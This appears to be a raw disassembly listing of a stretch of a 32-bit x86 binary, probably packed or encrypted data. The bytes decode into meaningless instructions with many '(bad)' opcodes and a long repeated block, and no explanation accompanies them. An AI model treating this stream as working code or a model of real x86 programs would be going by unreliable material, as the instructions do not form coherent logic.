  40dc7b:	d3 34 4d c9 7d fa 59 	shll   %cl,0x59fa7dc9(,%ecx,2)
  40dc82:	47                   	inc    %edi
  40dc83:	f0 34 4d             	lock xor $0x4d,%al
  40dc86:	d3 34 ad d4 a2 af 9c 	shll   %cl,-0x63505d2c(,%ebp,4)
  40dc8d:	d3 34 4d d3 a4 72 c0 	shll   %cl,-0x3f8d5b2d(,%ecx,2)
  40dc94:	b7 fd                	mov    $0xfd,%bh
  40dc96:	4d                   	dec    %ebp
  40dc97:	d3 34 4d 93 26 36 3f 	shll   %cl,0x3f362693(,%ecx,2)
  40dc9e:	f7 cc 34 4d d3 34    	test   $0x34d34d34,%esp
  40dca4:	34 a5                	xor    $0xa5,%al
  40dca6:	e5 f1                	in     $0xf1,%eax
  40dca8:	71 d3                	jno    0x40dc7d
  40dcaa:	34 4d                	xor    $0x4d,%al
  40dcac:	d3 d8                	rcr    %cl,%eax
  40dcae:	31 15 04 c7 4d d3    	xor    %edx,0xd34dc704
  40dcb4:	34 4d                	xor    $0x4d,%al
  40dcb6:	23 c3                	and    %ebx,%eax
  40dcb8:	18 96 05 9a 34 4d    	sbb    %dl,0x4d349a05(%esi)
  40dcbe:	d3 34 07             	shll   %cl,(%edi,%eax,1)
  40dcc1:	12 80 e2 eb d3 34    	adc    0x34d3ebe2(%eax),%al
  40dcc7:	4d                   	dec    %ebp
  40dcc8:	d3 27                	shll   %cl,(%edi)
  40dcca:	b2 75                	mov    $0x75,%dl
  40dccc:	09 83 4d d3 34 4d    	or     %eax,0x4d34d34d(%ebx)
  40dcd2:	2c 1a                	sub    $0x1a,%al
  40dcd4:	1b 6e 5a             	sbb    0x5a(%esi),%ebp
  40dcd7:	a0 34 4d d3 34       	mov    0x34d34d34,%al
  40dcdc:	52                   	push   %edx
  40dcdd:	3b d6                	cmp    %esi,%edx
  40dcdf:	b3 29                	mov    $0x29,%bl
  40dce1:	d3 34 4d d3 e3 2f 84 	shll   %cl,-0x7bd01c2d(,%ecx,2)
  40dce8:	53                   	push   %ebx
  40dce9:	d1 4d d3             	rorl   $1,-0x2d(%ebp)
  40dcec:	34 4d                	xor    $0x4d,%al
  40dcee:	00 ed                	add    %ch,%ch
  40dcf0:	20 fc                	and    %bh,%ah
  40dcf2:	b1 5b                	mov    $0x5b,%cl
  40dcf4:	34 4d                	xor    $0x4d,%al
  40dcf6:	d3 34 6a             	shll   %cl,(%edx,%ebp,2)
  40dcf9:	cb                   	lret
  40dcfa:	be 39 4a d3 34       	mov    $0x34d34a39,%esi
  40dcff:	4d                   	dec    %ebp
  40dd00:	d3 4c 58 cf          	rorl   %cl,-0x31(%eax,%ebx,2)
  40dd04:	d0 ef                	shr    $1,%bh
  40dd06:	4d                   	dec    %ebp
  40dd07:	d3 34 4d aa fb 43 4d 	shll   %cl,0x4d43fbaa(,%ecx,2)
  40dd0e:	33 85 34 4d d3 34    	xor    0x34d34d34(%ebp),%eax
  40dd14:	45                   	inc    %ebp
  40dd15:	f9                   	stc
  40dd16:	02 7f 50             	add    0x50(%edi),%bh
  40dd19:	d3 34 4d d3 3c 9f a8 	shll   %cl,-0x5760c32d(,%ecx,2)
  40dd20:	51                   	push   %ecx
  40dd21:	a3 4d d3 34 4d       	mov    %eax,0x4d34d34d
  40dd26:	40                   	inc    %eax
  40dd27:	8f                   	(bad)
  40dd28:	92                   	xchg   %eax,%edx
  40dd29:	9d                   	popf
  40dd2a:	38 f5                	cmp    %dh,%ch
  40dd2c:	34 4d                	xor    $0x4d,%al
  40dd2e:	d3 34 bc             	shll   %cl,(%esp,%edi,4)
  40dd31:	b6 da                	mov    $0xda,%dh
  40dd33:	21 10                	and    %edx,(%eax)
  40dd35:	d3 34 4d d3 ff f3 d2 	shll   %cl,-0x2d0c002d(,%ecx,2)
  40dd3c:	cd 0c                	int    $0xc
  40dd3e:	4d                   	dec    %ebp
  40dd3f:	d3 34 4d 13 ec 5f 97 	shll   %cl,-0x68a013ed(,%ecx,2)
  40dd46:	44                   	inc    %esp
  40dd47:	17                   	pop    %ss
  40dd48:	34 4d                	xor    $0x4d,%al
  40dd4a:	d3 34 c4             	shll   %cl,(%esp,%eax,8)
  40dd4d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40dd4e:	7e 3d                	jle    0x40dd8d
  40dd50:	64 d3 34 4d d3 5d 19 	shll   %cl,%fs:0x73195dd3(,%ecx,2)
  40dd57:	73 
  40dd58:	60                   	pusha
  40dd59:	81 4d d3 34 4d 4f dc 	orl    $0xdc4f4d34,-0x2d(%ebp)
  40dd60:	22 2a                	and    (%edx),%ch
  40dd62:	90                   	nop
  40dd63:	88 34 4d d3 34 46 ee 	mov    %dh,-0x11b9cb2d(,%ecx,2)
  40dd6a:	b8 14 de d3 34       	mov    $0x34d3de14,%eax
  40dd6f:	4d                   	dec    %ebp
  40dd70:	d3 5e 0b             	rcrl   %cl,0xb(%esi)
  40dd73:	db e0                	fneni(8087 only)
  40dd75:	32 4d d3             	xor    -0x2d(%ebp),%cl
  40dd78:	34 4d                	xor    $0x4d,%al
  40dd7a:	3a 0a                	cmp    (%edx),%cl
  40dd7c:	49                   	dec    %ecx
  40dd7d:	06                   	push   %es
  40dd7e:	24 5c                	and    $0x5c,%al
  40dd80:	34 4d                	xor    $0x4d,%al
  40dd82:	d3 34 c2             	shll   %cl,(%edx,%eax,8)
  40dd85:	d3 ac 62 91 d3 34 4d 	shrl   %cl,0x4d34d391(%edx,%eiz,2)
  40dd8c:	d3 95 e4 79 e7 c8    	rcll   %cl,-0x3718861c(%ebp)
  40dd92:	4d                   	dec    %ebp
  40dd93:	d3 34 4d 37 6d 8d d5 	shll   %cl,-0x2a7292c9(,%ecx,2)
  40dd9a:	4e                   	dec    %esi
  40dd9b:	a9 34 4d d3 34       	test   $0x34d34d34,%eax
  40dda0:	6c                   	insb   (%dx),%es:(%edi)
  40dda1:	56                   	push   %esi
  40dda2:	f4                   	hlt
  40dda3:	ea 65 d3 34 4d d3 7a 	ljmp   $0x7ad3,$0x4d34d365
  40ddaa:	ae                   	scas   %es:(%edi),%al
  40ddab:	08 ba 78 4d d3 34    	or     %bh,0x34d34d78(%edx)
  40ddb1:	4d                   	dec    %ebp
  40ddb2:	25 2e 1c a6 b4       	and    $0xb4a61c2e,%eax
  40ddb7:	c6                   	(bad)
  40ddb8:	34 4d                	xor    $0x4d,%al
  40ddba:	d3 34 e8             	shll   %cl,(%eax,%ebp,8)
  40ddbd:	dd 74 1f 4b          	fnsave 0x4b(%edi,%ebx,1)
  40ddc1:	d3 34 4d d3 bd 8b 8a 	shll   %cl,-0x7574422d(,%ecx,2)
  40ddc8:	70 3e                	jo     0x40de08
  40ddca:	4d                   	dec    %ebp
  40ddcb:	d3 34 4d b5 66 48 03 	shll   %cl,0x34866b5(,%ecx,2)
  40ddd2:	f6 0e 34             	testb  $0x34,(%esi)
  40ddd5:	4d                   	dec    %ebp
  40ddd6:	d3 34 61             	shll   %cl,(%ecx,%eiz,2)
  40ddd9:	35 57 b9 86 d3       	xor    $0xd386b957,%eax
  40ddde:	34 4d                	xor    $0x4d,%al
  40dde0:	d3 c1                	rol    %cl,%ecx
  40dde2:	1d 9e e1 f8 4d       	sbb    $0x4df8e19e,%eax
  40dde7:	d3 34 4d 98 11 69 d9 	shll   %cl,-0x2696ee68(,%ecx,2)
  40ddee:	8e 94 34 4d d3 34 9b 	mov    -0x64cb2cb3(%esp,%esi,1),%ss
  40ddf5:	1e                   	push   %ds
  40ddf6:	87 e9                	xchg   %ebp,%ecx
  40ddf8:	ce                   	into
  40ddf9:	d3 34 4d d3 55 28 df 	shll   %cl,-0x20d7aa2d(,%ecx,2)
  40de00:	8c a1 4d d3 34 4d    	mov    %fs,0x4d34d34d(%ecx)
  40de06:	89 0d bf e6 42 68    	mov    %ecx,0x6842e6bf
  40de0c:	34 4d                	xor    $0x4d,%al
  40de0e:	d3 34 41             	shll   %cl,(%ecx,%eax,2)
  40de11:	99                   	cltd
  40de12:	2d 0f b0 d3 34       	sub    $0x34d3b00f,%eax
  40de17:	4d                   	dec    %ebp
  40de18:	d3 54 bb 16          	rcll   %cl,0x16(%ebx,%edi,4)
  40de1c:	63 7c 4d d3          	arpl   %edi,-0x2d(%ebp,%ecx,2)
  40de20:	34 4d                	xor    $0x4d,%al
  40de22:	77 7b                	ja     0x40de9f
  40de24:	f2 6b 6f c5 34       	repnz imul $0x34,-0x3b(%edi),%ebp
  40de29:	4d                   	dec    %ebp
  40de2a:	d3 34 30             	shll   %cl,(%eax,%esi,1)
  40de2d:	01 67 2b             	add    %esp,0x2b(%edi)
  40de30:	fe                   	(bad)
  40de31:	d3 34 4d d3 d7 ab 76 	shll   %cl,0x76abd7d3(,%ecx,2)
  40de38:	ca 82 4d             	lret   $0x4d82
  40de3b:	d3 34 4d c9 7d fa 59 	shll   %cl,0x59fa7dc9(,%ecx,2)
  40de42:	47                   	inc    %edi
  40de43:	f0 34 4d             	lock xor $0x4d,%al
  40de46:	d3 34 ad d4 a2 af 9c 	shll   %cl,-0x63505d2c(,%ebp,4)
  40de4d:	d3 34 4d d3 a4 72 c0 	shll   %cl,-0x3f8d5b2d(,%ecx,2)
  40de54:	b7 fd                	mov    $0xfd,%bh
  40de56:	4d                   	dec    %ebp
  40de57:	d3 34 4d 93 26 36 3f 	shll   %cl,0x3f362693(,%ecx,2)
  40de5e:	f7 cc 34 4d d3 34    	test   $0x34d34d34,%esp
  40de64:	34 a5                	xor    $0xa5,%al
  40de66:	e5 f1                	in     $0xf1,%eax
  40de68:	71 d3                	jno    0x40de3d
  40de6a:	34 4d                	xor    $0x4d,%al
  40de6c:	d3 d8                	rcr    %cl,%eax
  40de6e:	31 15 04 c7 4d d3    	xor    %edx,0xd34dc704
  40de74:	34 4d                	xor    $0x4d,%al
  40de76:	23 c3                	and    %ebx,%eax
  40de78:	18 96 05 9a 34 4d    	sbb    %dl,0x4d349a05(%esi)
  40de7e:	d3 34 07             	shll   %cl,(%edi,%eax,1)
  40de81:	12 80 e2 eb d3 34    	adc    0x34d3ebe2(%eax),%al
  40de87:	4d                   	dec    %ebp
  40de88:	d3 27                	shll   %cl,(%edi)
  40de8a:	b2 75                	mov    $0x75,%dl
  40de8c:	09 83 4d d3 34 4d    	or     %eax,0x4d34d34d(%ebx)
  40de92:	2c 1a                	sub    $0x1a,%al
  40de94:	1b 6e 5a             	sbb    0x5a(%esi),%ebp
  40de97:	a0 34 4d d3 34       	mov    0x34d34d34,%al
  40de9c:	52                   	push   %edx
  40de9d:	3b d6                	cmp    %esi,%edx
  40de9f:	b3 29                	mov    $0x29,%bl
  40dea1:	d3 34 4d d3 e3 2f 84 	shll   %cl,-0x7bd01c2d(,%ecx,2)
  40dea8:	53                   	push   %ebx
  40dea9:	d1 4d d3             	rorl   $1,-0x2d(%ebp)
  40deac:	34 4d                	xor    $0x4d,%al
  40deae:	00 ed                	add    %ch,%ch
  40deb0:	20 fc                	and    %bh,%ah
  40deb2:	b1 5b                	mov    $0x5b,%cl
  40deb4:	34 4d                	xor    $0x4d,%al
  40deb6:	d3 34 6a             	shll   %cl,(%edx,%ebp,2)
  40deb9:	cb                   	lret
  40deba:	be 39 4a d3 34       	mov    $0x34d34a39,%esi
  40debf:	4d                   	dec    %ebp
  40dec0:	d3 4c 58 cf          	rorl   %cl,-0x31(%eax,%ebx,2)
  40dec4:	d0 ef                	shr    $1,%bh
  40dec6:	4d                   	dec    %ebp
  40dec7:	d3 34 4d aa fb 43 4d 	shll   %cl,0x4d43fbaa(,%ecx,2)
  40dece:	33 85 34 4d d3 34    	xor    0x34d34d34(%ebp),%eax
  40ded4:	45                   	inc    %ebp
  40ded5:	f9                   	stc
  40ded6:	02 7f 50             	add    0x50(%edi),%bh
  40ded9:	d3 34 4d d3 3c 9f a8 	shll   %cl,-0x5760c32d(,%ecx,2)
  40dee0:	51                   	push   %ecx
  40dee1:	a3 4d d3 34 4d       	mov    %eax,0x4d34d34d
  40dee6:	40                   	inc    %eax
  40dee7:	8f                   	(bad)
  40dee8:	92                   	xchg   %eax,%edx
  40dee9:	9d                   	popf
  40deea:	38 f5                	cmp    %dh,%ch
  40deec:	34 4d                	xor    $0x4d,%al
  40deee:	d3 34 bc             	shll   %cl,(%esp,%edi,4)
  40def1:	b6 da                	mov    $0xda,%dh
  40def3:	21 10                	and    %edx,(%eax)
  40def5:	d3 34 4d d3 ff f3 d2 	shll   %cl,-0x2d0c002d(,%ecx,2)
  40defc:	cd 0c                	int    $0xc
  40defe:	4d                   	dec    %ebp
  40deff:	d3 34 4d 13 ec 5f 97 	shll   %cl,-0x68a013ed(,%ecx,2)
  40df06:	44                   	inc    %esp
  40df07:	17                   	pop    %ss
  40df08:	34 4d                	xor    $0x4d,%al
  40df0a:	d3 34 c4             	shll   %cl,(%esp,%eax,8)
  40df0d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40df0e:	7e 3d                	jle    0x40df4d
  40df10:	64 d3 34 4d d3 5d 19 	shll   %cl,%fs:0x73195dd3(,%ecx,2)
  40df17:	73 
  40df18:	60                   	pusha
  40df19:	81 4d d3 34 4d 4f dc 	orl    $0xdc4f4d34,-0x2d(%ebp)
  40df20:	22 2a                	and    (%edx),%ch
  40df22:	90                   	nop
  40df23:	88 34 4d d3 34 46 ee 	mov    %dh,-0x11b9cb2d(,%ecx,2)
  40df2a:	b8 14 de d3 34       	mov    $0x34d3de14,%eax
  40df2f:	4d                   	dec    %ebp
  40df30:	d3 5e 0b             	rcrl   %cl,0xb(%esi)
  40df33:	db e0                	fneni(8087 only)
  40df35:	32 4d d3             	xor    -0x2d(%ebp),%cl
  40df38:	34 4d                	xor    $0x4d,%al
  40df3a:	3a 0a                	cmp    (%edx),%cl
  40df3c:	49                   	dec    %ecx
  40df3d:	06                   	push   %es
  40df3e:	24 5c                	and    $0x5c,%al
  40df40:	34 4d                	xor    $0x4d,%al
  40df42:	d3 34 c2             	shll   %cl,(%edx,%eax,8)
  40df45:	d3 ac 62 91 d3 34 4d 	shrl   %cl,0x4d34d391(%edx,%eiz,2)
  40df4c:	d3 95 e4 79 e7 c8    	rcll   %cl,-0x3718861c(%ebp)
  40df52:	4d                   	dec    %ebp
  40df53:	d3 34 4d 37 6d 8d d5 	shll   %cl,-0x2a7292c9(,%ecx,2)
  40df5a:	4e                   	dec    %esi
  40df5b:	a9 34 4d d3 34       	test   $0x34d34d34,%eax
  40df60:	6c                   	insb   (%dx),%es:(%edi)
  40df61:	56                   	push   %esi
  40df62:	f4                   	hlt
  40df63:	ea 65 d3 34 4d d3 7a 	ljmp   $0x7ad3,$0x4d34d365
  40df6a:	ae                   	scas   %es:(%edi),%al
  40df6b:	08 ba 78 4d d3 34    	or     %bh,0x34d34d78(%edx)
  40df71:	4d                   	dec    %ebp
  40df72:	25 2e 1c a6 b4       	and    $0xb4a61c2e,%eax
  40df77:	c6                   	(bad)
  40df78:	34 4d                	xor    $0x4d,%al
  40df7a:	d3 34 e8             	shll   %cl,(%eax,%ebp,8)
  40df7d:	dd 74 1f 4b          	fnsave 0x4b(%edi,%ebx,1)
  40df81:	d3 34 4d d3 bd 8b 8a 	shll   %cl,-0x7574422d(,%ecx,2)
  40df88:	70 3e                	jo     0x40dfc8
  40df8a:	4d                   	dec    %ebp
  40df8b:	d3 34 4d b5 66 48 03 	shll   %cl,0x34866b5(,%ecx,2)
  40df92:	f6 0e 34             	testb  $0x34,(%esi)
  40df95:	4d                   	dec    %ebp
  40df96:	d3 34 61             	shll   %cl,(%ecx,%eiz,2)
  40df99:	35 57 b9 86 d3       	xor    $0xd386b957,%eax
  40df9e:	34 4d                	xor    $0x4d,%al
  40dfa0:	d3 c1                	rol    %cl,%ecx
  40dfa2:	1d 9e e1 f8 4d       	sbb    $0x4df8e19e,%eax
  40dfa7:	d3 34 4d 98 11 69 d9 	shll   %cl,-0x2696ee68(,%ecx,2)
  40dfae:	8e 94 34 4d d3 34 9b 	mov    -0x64cb2cb3(%esp,%esi,1),%ss
  40dfb5:	1e                   	push   %ds
  40dfb6:	87 e9                	xchg   %ebp,%ecx
  40dfb8:	ce                   	into
  40dfb9:	d3 34 4d d3 55 28 df 	shll   %cl,-0x20d7aa2d(,%ecx,2)
  40dfc0:	8c a1 4d d3 34 4d    	mov    %fs,0x4d34d34d(%ecx)
  40dfc6:	89 0d bf e6 42 68    	mov    %ecx,0x6842e6bf
  40dfcc:	34 4d                	xor    $0x4d,%al
  40dfce:	d3 34 41             	shll   %cl,(%ecx,%eax,2)
  40dfd1:	99                   	cltd
  40dfd2:	2d 0f b0 ff 37       	sub    $0x37ffb00f,%eax
  40dfd7:	4d                   	dec    %ebp
  40dfd8:	d3 54 bb 16          	rcll   %cl,0x16(%ebx,%edi,4)
  40dfdc:	51                   	push   %ecx
  40dfdd:	f4                   	hlt
  40dfde:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40dfdf:	50                   	push   %eax
  40dfe0:	7e 41                	jle    0x40e023
  40dfe2:	65 53                	gs push %ebx
  40dfe4:	1a 17                	sbb    (%edi),%dl
  40dfe6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40dfe7:	ff                   	(bad)
  40dfe8:	ff                   	(bad)
  40dfe9:	ff                   	(bad)
  40dfea:	ff c3                	inc    %ebx
  40dfec:	3a 27                	cmp    (%edi),%ah
  40dfee:	5e                   	pop    %esi
  40dfef:	96                   	xchg   %eax,%esi
  40dff0:	3b ab 6b cb 1f 9d    	cmp    -0x62e03495(%ebx),%ebp
  40dff6:	45                   	inc    %ebp
  40dff7:	f1                   	int1
  40dff8:	ac                   	lods   %ds:(%esi),%al
  40dff9:	fa                   	cli
  40dffa:	58                   	pop    %eax
  40dffb:	ab                   	stos   %eax,%es:(%edi)
  40dffc:	4b                   	dec    %ebx
  40dffd:	e3 03                	jecxz  0x40e002
  40dfff:	93                   	xchg   %eax,%ebx
  40e000:	20 30                	and    %dh,(%eax)
  40e002:	fa                   	cli
  40e003:	55                   	push   %ebp
  40e004:	ad                   	lods   %ds:(%esi),%eax
  40e005:	76 6d                	jbe    0x40e074
  40e007:	f6 88 cc 76 ff 6f fc 	testb  $0xfc,0x6fff76cc(%eax)
  40e00e:	ff 91 f5 02 4c 25    	call   *0x254c02f5(%ecx)
  40e014:	4f                   	dec    %edi
  40e015:	e5 d7                	in     $0xd7,%eax
  40e017:	fc                   	cld
  40e018:	c5 2a                	lds    (%edx),%ebp
  40e01a:	cb                   	lret
  40e01b:	d7                   	xlat   %ds:(%ebx)
  40e01c:	26 21 80 b5 62 a3 8f 	and    %eax,%es:-0x705c9d4b(%eax)
  40e023:	de b1 5a 49 25 ba    	fidivs -0x45dab6a6(%ecx)
  40e029:	ff 37                	push   (%edi)
  40e02b:	fa                   	cli
  40e02c:	ff 1b                	lcall  *(%ebx)
  40e02e:	67 45                	addr16 inc %ebp
  40e030:	ea 0e 98 5d fe c0 e1 	ljmp   $0xe1c0,$0xfe5d980e
  40e037:	c3                   	ret
  40e038:	2f                   	das
  40e039:	75 a7                	jne    0x40dfe2
  40e03b:	4c                   	dec    %esp
  40e03c:	f0 12 8d 46 97 a3 6b 	lock adc 0x6ba39746(%ebp),%cl
  40e043:	d3 f9                	sar    %cl,%ecx
  40e045:	0b fd                	or     %ebp,%edi
  40e047:	ff                   	(bad)
  40e048:	ff c6                	inc    %esi
  40e04a:	03 8f 5f e7 15 92    	add    -0x6dea18a1(%edi),%ecx
  40e050:	9c                   	pushf
  40e051:	95                   	xchg   %eax,%ebp
  40e052:	bf 6d 7a eb 95       	mov    $0x95eb7a6d,%edi
  40e057:	52                   	push   %edx
  40e058:	59                   	pop    %ecx
  40e059:	da d4                	fcmovbe %st(4),%st
  40e05b:	be 83 2d 58 49       	mov    $0x49582d83,%esi
  40e060:	d3 ff                	sar    %cl,%edi
  40e062:	ff                   	(bad)
  40e063:	ff                   	(bad)
  40e064:	ff 49 e0             	decl   -0x20(%ecx)
  40e067:	69 29 8e c9 c8 44    	imul   $0x44c8c98e,(%ecx),%ebp
  40e06d:	75 c2                	jne    0x40e031
  40e06f:	89 6a f4             	mov    %ebp,-0xc(%edx)
  40e072:	8e 79 78             	mov    0x78(%ecx),%?
  40e075:	99                   	cltd
  40e076:	58                   	pop    %eax
  40e077:	3e 6b 27 b9          	imul   $0xffffffb9,%ds:(%edi),%esp
  40e07b:	71 dd                	jno    0x40e05a
  40e07d:	be e1 4f b6 f0       	mov    $0xf0b64fe1,%esi
  40e082:	88 ad 17 ff ff ff    	mov    %ch,-0xe9(%ebp)
  40e088:	ff c9                	dec    %ecx
  40e08a:	20 ac 66 7d ce 3a b4 	and    %ch,-0x4bc53183(%esi,%eiz,2)
  40e091:	63 df                	arpl   %ebx,%edi
  40e093:	4a                   	dec    %edx
  40e094:	18 e5                	sbb    %ah,%ch
  40e096:	1a 31                	sbb    (%ecx),%dh
  40e098:	82 97 51 33 60 62 53 	adcb   $0x53,0x62603351(%edi)
  40e09f:	7f 45                	jg     0x40e0e6
  40e0a1:	b1 64                	mov    $0x64,%cl
  40e0a3:	77 e0                	ja     0x40e085
  40e0a5:	bb 6b ae 84 ff       	mov    $0xff84ae6b,%ebx
  40e0aa:	ff                   	(bad)
  40e0ab:	ff                   	(bad)
  40e0ac:	ff                   	(bad)
  40e0ad:	fe 81 a0 1c f9 08    	incb   0x8f91ca0(%ecx)
  40e0b3:	2b 94 70 48 68 58 8f 	sub    -0x70a797b8(%eax,%esi,2),%edx
  40e0ba:	45                   	inc    %ebp
  40e0bb:	fd                   	std
  40e0bc:	19 94 de 6c 87 52 7b 	sbb    %edx,0x7b52876c(%esi,%ebx,8)
  40e0c3:	f8                   	clc
  40e0c4:	b7 ab                	mov    $0xab,%bh
  40e0c6:	73 d3                	jae    0x40e09b
  40e0c8:	23 72 4b             	and    0x4b(%edx),%esi
  40e0cb:	02 e2                	add    %dl,%ah
  40e0cd:	ff                   	(bad)
  40e0ce:	ff                   	(bad)
  40e0cf:	ff                   	(bad)
  40e0d0:	ff e3                	jmp    *%ebx
  40e0d2:	1f                   	pop    %ds
  40e0d3:	8f                   	(bad)
  40e0d4:	57                   	push   %edi
  40e0d5:	66 55                	push   %bp
  40e0d7:	ab                   	stos   %eax,%es:(%edi)
  40e0d8:	2a b2 eb 28 07 2f    	sub    0x2f0728eb(%edx),%dh
  40e0de:	b5 c2                	mov    $0xc2,%ch
  40e0e0:	03 86 c5 7b 9a d3    	add    -0x2c65843b(%esi),%eax
  40e0e6:	37                   	aaa
  40e0e7:	08 a5 30 28 87 f2    	or     %ah,-0xd78d7d0(%ebp)
  40e0ed:	23 bf a5 b2 ff ff    	and    -0x4d5b(%edi),%edi
  40e0f3:	ff                   	(bad)
  40e0f4:	ff 02                	incl   (%edx)
  40e0f6:	03 6a ba             	add    -0x46(%edx),%ebp
  40e0f9:	ed                   	in     (%dx),%eax
  40e0fa:	16                   	push   %ss
  40e0fb:	82 5c 8a cf 1c       	sbbb   $0x1c,-0x31(%edx,%ecx,4)
  40e100:	2b a7 79 b4 92 f3    	sub    -0xc6d4b87(%edi),%esp
  40e106:	07                   	pop    %es
  40e107:	f2 f0 4e             	repnz lock dec %esi
  40e10a:	69 e2 a1 65 da f4    	imul   $0xf4da65a1,%edx,%esp
  40e110:	cd 06                	int    $0x6
  40e112:	05 be d5 02 fe       	add    $0xfe02d5be,%eax
  40e117:	ff                   	(bad)
  40e118:	ff d1                	call   *%ecx
  40e11a:	34 62                	xor    $0x62,%al
  40e11c:	1f                   	pop    %ds
  40e11d:	c4 a6 fe 8a 34 2e    	les    0x2e348afe(%esi),%esp
  40e123:	53                   	push   %ebx
  40e124:	9d                   	popf
  40e125:	a2 f3 55 a0 05       	mov    %al,0x5a055f3
  40e12a:	8a e1                	mov    %cl,%ah
  40e12c:	32 a4 f6 eb ff ff ff 	xor    -0x15(%esi,%esi,8),%ah
  40e133:	5f                   	pop    %edi
  40e134:	12 ec                	adc    %ah,%ch
  40e136:	39 40 60             	cmp    %eax,0x60(%eax)
  40e139:	ef                   	out    %eax,(%dx)
  40e13a:	aa                   	stos   %al,%es:(%edi)
  40e13b:	5e                   	pop    %esi
  40e13c:	71 9f                	jno    0x40e0dd
  40e13e:	06                   	push   %es
  40e13f:	bd 6e 10 51 3e       	mov    $0x3e51106e,%ebp
  40e144:	21 8a f9 96 dd 06    	and    %ecx,0x6dd96f9(%edx)
  40e14a:	3d dd 3e 05 ae       	cmp    $0xae053edd,%eax
  40e14f:	4d                   	dec    %ebp
  40e150:	e6 ff                	out    %al,$0xff
  40e152:	ff                   	(bad)
  40e153:	ff                   	(bad)
  40e154:	ff                   	(bad)
  40e155:	bd 46 91 54 8d       	mov    $0x8d549146,%ebp
  40e15a:	b5 71                	mov    $0x71,%ch
  40e15c:	c4 5d 05             	les    0x5(%ebp),%ebx
  40e15f:	04 06                	add    $0x6,%al
  40e161:	d4 6f                	aam    $0x6f
  40e163:	60                   	pusha
  40e164:	50                   	push   %eax
  40e165:	15 ff 19 98 fb       	adc    $0xfb9819ff,%eax
  40e16a:	24 d6                	and    $0xd6,%al
  40e16c:	bd e9 97 89 40       	mov    $0x408997e9,%ebp
  40e171:	43                   	inc    %ebx
  40e172:	cc                   	int3
  40e173:	67 d9 fc             	addr16 frndint
  40e176:	ff                   	(bad)
  40e177:	ff                   	(bad)
  40e178:	ff 9e 77 b0 e8 42    	lcall  *0x42e8b077(%esi)
  40e17e:	bd 07 89 8b 88       	mov    $0x888b8907,%ebp
  40e183:	e7 19                	out    %eax,$0x19
  40e185:	5b                   	pop    %ebx
  40e186:	38 79 c8             	cmp    %bh,-0x38(%ecx)
  40e189:	ee                   	out    %al,(%dx)
  40e18a:	db a1 7c 0a 47 7c    	(bad) 0x7c470a7c(%ecx)
  40e190:	42                   	inc    %edx
  40e191:	0f e9 f8             	psubsw %mm0,%mm7
  40e194:	84 1e                	test   %bl,(%esi)
  40e196:	c9                   	leave
  40e197:	ff                   	(bad)
  40e198:	ff                   	(bad)
  40e199:	ff                   	lcall  (bad)
  40e19a:	df 09                	fisttps (%ecx)
  40e19c:	80 86 83 32 2b ed 48 	addb   $0x48,-0x12d4cd7d(%esi)
  40e1a3:	1e                   	push   %ds
  40e1a4:	11 70 ac             	adc    %esi,-0x54(%eax)
  40e1a7:	6c                   	insb   (%dx),%es:(%edi)
  40e1a8:	5a                   	pop    %edx
  40e1a9:	72 4e                	jb     0x40e1f9
  40e1ab:	fd                   	std
  40e1ac:	0e                   	push   %cs
  40e1ad:	ff                   	(bad)
  40e1ae:	fb                   	sti
  40e1af:	0f 85 38 56 3d ae    	jne    0xae7e37ed
  40e1b5:	d5 1e                	aad    $0x1e
  40e1b7:	36 ff                	ss (bad)
  40e1b9:	ff                   	(bad)
  40e1ba:	ff                   	(bad)
  40e1bb:	ff 2d 39 27 0a 0f    	ljmp   *0xf0a2739
  40e1c1:	d9 64 68 5c          	fldenv 0x5c(%eax,%ebp,2)
  40e1c5:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e1c6:	21 9b 5b 54 d1 24    	and    %ebx,0x24d1545b(%ebx)
  40e1cc:	36 2e 3a 0c 0a       	ss cmp %cs:(%edx,%ecx,1),%cl
  40e1d1:	67 b1 93             	addr16 mov $0x93,%cl
  40e1d4:	57                   	push   %edi
  40e1d5:	e7 0f                	out    %eax,$0xf
  40e1d7:	b4 ee                	mov    $0xee,%ah
  40e1d9:	96                   	xchg   %eax,%esi
  40e1da:	d2 1b                	rcrb   %cl,(%ebx)
  40e1dc:	ff                   	(bad)
  40e1dd:	ff                   	(bad)
  40e1de:	ff                   	(bad)
  40e1df:	ff 9b 91 9e 80 c0    	lcall  *-0x3f7f616f(%ebx)
  40e1e5:	c5 4f 61             	lds    0x61(%edi),%ecx
  40e1e8:	dc 20                	fsubl  (%eax)
  40e1ea:	a2 5a 77 4b 69       	mov    %al,0x694b775a
  40e1ef:	1c 12                	sbb    $0x12,%al
  40e1f1:	1a 16                	sbb    (%esi),%dl
  40e1f3:	e2 93                	loop   0x40e188
  40e1f5:	ba 0a c0 a0 2a       	mov    $0x2aa0c00a,%edx
  40e1fa:	e5 3c                	in     $0x3c,%eax
  40e1fc:	22 e0                	and    %al,%ah
  40e1fe:	43                   	inc    %ebx
  40e1ff:	12 ff                	adc    %bh,%bh
  40e201:	ff                   	(bad)
  40e202:	bf f1 1b 17 1d       	mov    $0x1d171bf1,%edi
  40e207:	0e                   	push   %cs
  40e208:	25 0b f2 8b c7       	and    $0xc78bf20b,%eax
  40e20d:	ad                   	lods   %ds:(%esi),%eax
  40e20e:	2d b6 a8 b9 14       	sub    $0x14b9a8b6,%eax
  40e213:	1e                   	push   %ds
  40e214:	a9 c8 57 f1 19       	test   $0x19f157c8,%eax
  40e219:	85 af 75 07 4c ff    	test   %ebp,-0xb3f88b(%edi)
  40e21f:	5b                   	pop    %ebx
  40e220:	fc                   	cld
  40e221:	ff                   	ljmp   (bad)
  40e222:	ee                   	out    %al,(%dx)
  40e223:	99                   	cltd
  40e224:	dd bb a3 7f 60 fd    	fnstsw -0x29f805d(%ebx)
  40e22a:	f7 01 26 9f 5c 72    	testl  $0x725c9f26,(%ecx)
  40e230:	36 44                	ss inc %esp
  40e232:	66 3b c5             	cmp    %bp,%ax
  40e235:	5b                   	pop    %ebx
  40e236:	fb                   	sti
  40e237:	7e 34                	jle    0x40e26d
  40e239:	8b ff                	mov    %edi,%edi
  40e23b:	ff c6                	inc    %esi
  40e23d:	ff 43 29             	incl   0x29(%ebx)
  40e240:	76 cb                	jbe    0x40e20d
  40e242:	23 c6                	and    %esi,%eax
  40e244:	dc b6 ed fc 4d e4    	fdivl  -0x1bb20313(%esi)
  40e24a:	f1                   	int1
